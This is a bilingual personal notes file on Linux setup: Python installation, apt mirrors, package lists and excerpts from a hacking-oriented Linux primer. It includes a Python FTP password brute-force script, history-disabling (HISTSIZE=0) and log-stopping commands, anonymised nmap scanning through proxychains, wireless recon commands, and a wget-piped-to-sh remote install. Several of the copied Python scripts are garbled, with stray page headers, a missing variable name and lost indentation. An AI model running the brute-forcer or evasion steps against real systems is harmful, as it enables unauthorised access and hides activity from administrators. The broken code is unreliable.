sudo add-apt-repository ppa:deadsnakes/ppa
sudo apt install python3.8


手动方法2.

wget https://mirrors.huaweicloud.com/python/3.8.2/Python-3.8.2.tar.xz
tar xJvf file
./configure --enable-shared --prefix=/usr/local/python3.8 && make && sudo make install
./configure --enable-optimizations --enable-shared --prefix=/usr/local/python3.8 && make && sudo make install

sudo ln -sf /usr/local/Python3.8/bin/python3.8 /usr/bin/python3

### dpkg: error processing package 
```
Setting up python3.9 (3.9.2-1) ...
/var/lib/dpkg/info/python3.9.postinst: 9: /usr/bin/python3.9: not found
dpkg: error processing package 
```

```
dpkg -l | grep python3.9
sudo apt-get --purge remove libpython3.9:amd64 libpython3.9-dev:amd64 libpython3.9-minimal:amd64 libpython3.9-stdlib:amd64 python3.9 python3.9-minimal
```


# Linux Basic for hackers 

## process

ps aux

Filtering by Process Name

    ps aux | grep msfconsole
    -aux加横线是 standard syntax
    aux不加横线是 BSD syntax

Finding the Greediest Processes with top
    
    top

Changing Process Priority with nice

    −20 Most likely to  receive priority
    0 Default
    +19  Least likely to receive priority

Setting the Priority When Starting a Process

    kali >nice -n -10 /bin/slowprocess

Changing the Priority of a Running Process with renice

    kali >renice 20 6996

Killing Processes

    linux-basics-hackers-networking-scripting.pdf  --- Table 6-1: Commonly Used Kill Signals

    restart a process with the HUP signal, 
    kali >kill -1 6996

    kill process
    kali >kill -9 6996
    kali >killall -9 zombieprocess

Running Processes in the Background

    kali >leafpad newscript &

Moving a Process to the Foreground
    
    kali >fg 1234
    If you don’t know the PID, you can use the ps command to fnd it.

Scheduling Processes


    Table 6-2:Time Formats Accepted by the at Command
    Time format     Meaning
    at 7:20pm   Scheduled to run at 7:20 pM on the current day
    at 7:20pm June 25   Scheduled to run at 7:20 pM on June 25
    at noon Scheduled to run at noon on the current day
    at noon June 25     Scheduled to run at noon on June 25
    at tomorrow     Scheduled to run tomorrow
    at now+20 minutes   Scheduled to run in 20 minutes from the current time
    at now+10 hours     Scheduled to run in 10 hours from the current time
    at now +5 days  Scheduled to run in five days from the current date
    at now+3 weeks  Scheduled to run in three weeks from the current date
    at 7:20pm 06/25/2019    Scheduled to run at 7:20 PM on June 25,2019

    kali >at 7:20am
    at >/root/myscanningscript

## Managing User environMent variables

env

Viewing All Environment Variables

    kali >set | more
    kali >set | grep HISTSIZE

Changing Variable Values for a Session

    kali >HISTSIZE=0

Making Variable Value Changes Permanent

    kali >HISTSIZE=1000
    kali >export HISTSIZE

Changing Your Shell Prompt

```sh
kali>PS1="World's Best Hacker: #"
kali>export ps1
This will make the change permanent across all sessions.
```
Changing path

    PATH=$PATH:/root/newhackingtool

取消变量 `kali >unset MYNEWVARIABLE`

## Bash Scripting
Common Built-in Bash Commands
As promised, Table 8-1 gives you a list of some useful commands built
into bash.

__Table 8-1: Built-in Bash Commands__

Command|Function
--|--
:|Returns 0 or true
.|Executes a shell script
bg|Puts a job in the background
break|Exits the current loop
cd|Changes directory
continue|Resumes the current loop
echo|Displays the command arguments
eval|Evaluates the following expression
exec|Executes the following command without creating a new process
exit|Quits the shell
export|Makes a variable or function available to other programs
fg|Brings a job to the foregroundBash Scripting 91
Command|Function
getopts|Parses arguments to the shell script
jobs|Lists background (bg) jobs
pwd|Displays the current directory
read|Reads a line from standard input
readonly|Declares as variable as read-only
set|Lists all variables
shift|Moves the parameters to the left
test|Evaluates arguments
[ Performs a conditional test
times|Prints the user and system times
trap|Traps a signal
type|Displays how each argument would be interpreted as a command
umask|Changes the default permissions for a new file
unset|Deletes values from a variable or function
wait|Waits for a background process to complete

## 9.Compressing

gzip/bzip/compress
```sh
gzip HackersArise.*
gunzip HackersArise.*
bzip HackersArise.*
bunzip HackersArise.*
compress HackersArise.*
 HackersArise.tar.Z
uncompress HackersArise.*
```

Creating Bit-by-Bit or Physical Copies of Storage Devices

dd if=inputfile of=outputfile

## 10.Filesystemandstorage devicemanagement

ls -l /dev


Table 10-1:Device-Naming System

Device file | Description
--|--
sda|First SATA hard drive
sdb|Second SATA hard drive
sdc|Third SATA hard drive
sdd|Fourth SATA hard drive


view the partitions

`fdisk -l`

List Block Devices and Information with lsblk

`lsblk`

__mount and umount__

```sh
kali >mount /dev/sdb1 /mnt
kali >mount /dev/sdc1 /media
```

Monitoring Filesystems

`df` (disk free) will provide us with basic information

## 11 Logging system
leafpad /etc/rsyslog.conf
Automatically Cleaning Up Logs with logrotate
leafpad /etc/logrotate.conf

service rsyslog stop
## 12 Using and abUsing services

service servicename start|stop|restart
kali >service apache2 start

### Network Service
sudo ifconfig eth0 192.168.50.120 netmask 255.255.255.0 broadcast 192.168.50.255

sudo ifdown eth0
sudo ifup eth0
sudo service networking restart
sudo service network-manager restart

sudo ip addr flush dev eth0 # 清除残留网卡地址信息

netstat -ntl # 检查开放端口
## 13 Becoming Secure and anonymous

traceroute google.com
kali >proxychains <the command you want proxied> <arguments>
kali >proxychains nmap -sT - Pn <IP address>
kali >leafpad /etc/proxychains.conf

e.g
```python
[ProxyList]
 add proxy here...
socks4 114.134.186.12 22020
 meanwhile
 defaults set to "tor"
 socks4 127.0.0.1 9050
```

`>proxychains firefox www.hackers-arise.com`

dynamic chain
## 14 Understanding and inspecting Wireless netWorks

iwlist wlan0 scan

>iwlist wlan0 scan

nmcli dev wifi connect AP-SSID password APpassword

kali >nmcli dev wifi connect Hackers-Arise password 12345678
iwconfig

__Wi-Fi Recon with aircrack-ng__

airmon-ng start|stop|restart interface

kali >airmon-ng start wlan0
kali >airodump-ng wlan0mon

__Detecting and Connecting to Bluetooth__

__Bluetooth Scanning and Reconnaissance__

kali >apt-get install bluez
kali >hciconfig hci0 up

kali >hcitool scan
kali >hcitool inq

__Scanning for Services with sdptool__

kali >sdptool browse 76:6E:46:63:72:66

__Seeing Whether the Devices Are Reachable with l2ping__

kali >l2ping 76:6E:46:63:72:66 -c 4
## 15: Managing the Linux Kernel and Loadable Kernel Modules

__Checking the Kernel Version__

`kali >uname -a`

__Kernel Tuning with sysctl__

```
kali >sysctl -a | less
(sysctl -a | less | grep ipv4)
```

To enable IP forwarding, change the 0 to a 1 by entering the following:

```
kali >sysctl -w net.ipv4.ip_forward=1
vi /etc/sycstl.conf
```

__Managing Kernel Modules__

`kali>lsmod`

__Finding More Information with modinfo__

`kali >modinfo bluetooth`

__Adding and Removing Modules with modprobe__

```
kali >modprobe -a <module name>
kali >modprobe -r <module to be removed>
```

__Inserting and Removing a Kernel Module__

```
kali >modprobe -a HackersAriseNewVideo
kali >dmesg | grep video
```

## 16 Automating Tasks with Jobs scheduling

Table 16-1: Time Representations for Use in the crontab

Field|Time unit|Representation
--|--|--
1|Minute| 0–59
2|Hour| 0–23
3|Day| of the month 1–31
4|Month| 1–12
5|Day| of the week 0–7

```
M  H DOM MON DOW USER COMMAND
30 2 *   *   1-5 root /root/myscanningscript

kali >crontab -e
kali >leafpad /etc/crontab
```

__Scheduling a Backup Task__

every Saturday night/Sunday morning at 2 am:

`00 2 * * 0 backup /bin/systembackup.sh`

on the 15th and 30th of every month, regardless of what days of the week those dates fell on

`00 2 15,30 * * backup /root/systembackup.sh`

at 11 pm (hour 23), every day of the month, every month, but only on Monday through Friday (days 1–5). 

`00 23 * * 1-5 backup /root/systembackup.sh`

## 17 Python Scripting Basics for hackers

install nmap

Network Communications in Python

__Building a TCP Client__

```python
#! /usr/bin/python3
import socket
s = socket.socket()
s.connect(("192.168.1.101", 22))
answer = s.recv(1024)
print (answer)
s.close()
```

__Creating a TCP Listener__

```python
#! /usr/bin/python3
import socket
TCP_IP = "192.168.181.190"
TCP_PORT = 6996
BUFFER_SIZE = 100
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)196 Chapter 17
s.bind((TCP_IP, TCP_PORT))
s.listen (1)
conn, addr = s.accept()
print ('Connection address: ', addr )
while 1:
data=conn.recv(BUFFER_SIZE)
if not data:break
print ("Received data: ", data)
conn.send(data) #echo
conn.close()
```

__Improving Our Hacking Scripts__
```python
#! /usr/bin/python3
import socket
Ports = [21,22,25,3306]
for i in range (0,4):
= socket.socket()
Ports = Port[i]200 Chapter 17
print ('This Is the Banner for the Port')
print (Ports)
s.connect (("192.168.1.101", Port))
answer = s.recv (1024)
print (answer)
s.close ()
```

__Exceptions and Password Crackers__

```python
#! /usr/bin/python3
import ftplib
server = input("FTP Server: ")
user = input("username: ")
Passwordlist = input ("Path to Password List > ")
try:
    with open(Passwordlist, 'r') as pw:
    for word in pw:
        word = word.strip ('\r').strip('\n')
        try:
            ftp = ftplib.FTP(server)
            ftp.login(user, word)202 Chapter 17
            print ('Success! The password is ' + word)
        except:
            print('still trying...')
except:
    print ('Wordlist error')
```

# Linux目录说明 & 下载链接 

/etc/apt/sources.list.d  源列表
/usr/local               安装软件
~/.local/bin             软件


https://www.kali.org/releases/
https://images.kali.org/virtual-images/kali-linux-2021.2-vmware-amd64.7z

# 终端快捷键操作

重复10次输入1      --     Alt+10, 1


# Ubuntu

// 清华源20.4
```
# 默认注释了源码镜像以提高 apt update 速度，如有需要可自行取消注释
deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse
# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal main restricted universe multiverse
deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse
# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-updates main restricted universe multiverse
deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse
# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-backports main restricted universe multiverse
deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse
# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-security main restricted universe multiverse

# 预发布软件源，不建议启用
# deb https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse
# deb-src https://mirrors.tuna.tsinghua.edu.cn/ubuntu/ focal-proposed main restricted universe multiverse
```
sudo dpkg --add-architecture i386

sudo apt-get update
sudo apt install -y open-vm-tools-desktop fuse zlib1g:i386 libstdc++6:i386 libc6:i386 git build-essential openssh-server gcc g++ libssl-dev libssl1.1 libncurses5-dev libncurses-dev libffi-dev zsh
sudo apt install -y gdb vim zsh tmux

sudo service ssh start

wget https://github.com/robbyrussell/oh-my-zsh/raw/master/tools/install.sh -O - | sh
git clone --depth=1 https://github.com.cnpmjs.org/zsh-users/zsh-autosuggestions $ZSH_CUSTOM/plugins/zsh-autosuggestions

chsh -s `which zsh`

## kali&ubuntu

git clone https://gitee.com/wgf4242/LibcSearcher.git --depth=1 ~/Downloads/LibcSearcher
### ubuntu 最小化安装 

sudo apt install iproute2 ntpdate tcpdump telnet traceroute nfs-kernel-server nfs-common lrzsz tree openssl libssl-dev libpcre3 libpcre3-dev zlib1g-dev ntpdate tcpdump telnet traceroute gcc openssh-server lrzsz tree openssl libssl-dev libpcre3 libpcre3-dev zlib1g-dev ntpdate tcpdump telnet traceroute iotop unzip zip make -y
sudo apt-get install -y python3 curl libgmp3-dev libmpc-dev 

再来是安装glibc的源文件，命令如下：
sudo apt-get source libc6-dev
## python
./configure --enable-optimizations


